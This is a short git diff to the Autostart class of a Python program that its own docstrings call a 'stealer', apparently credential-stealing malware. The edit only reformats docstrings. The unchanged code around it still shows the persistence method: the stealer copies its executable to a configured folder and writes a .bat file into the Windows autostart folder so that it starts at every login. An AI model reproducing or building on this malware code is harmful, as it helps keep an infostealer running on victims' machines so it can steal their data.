@@ -16,7 +16,12 @@ class Autostart:
     def __create_copy(self) -> None:
         """
         Creates a copy of the stealer.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         self.executor_name = self.__executor_path.replace("\\", "/").split("/")[-1]
         copyfile(self.__executor_path, path.join(self.__config.ExecutorPath, self.executor_name))
@@ -24,7 +29,12 @@ class Autostart:
     def __add_to_autostart(self) -> None:
         """
         Adds the stealer to autostart.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         with open(rf"{self.__config.AutostartPath}\{self.__config.AutostartName}.bat", "w+") as file:
             file.write(f'@echo off\nstart "{self.__config.AutostartName}" "{self.__config.ExecutorPath}\\{self.executor_name}"')
@@ -34,7 +44,12 @@ class Autostart:
     def run(self) -> None:
         """
         Launches the autostart module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         try:
 
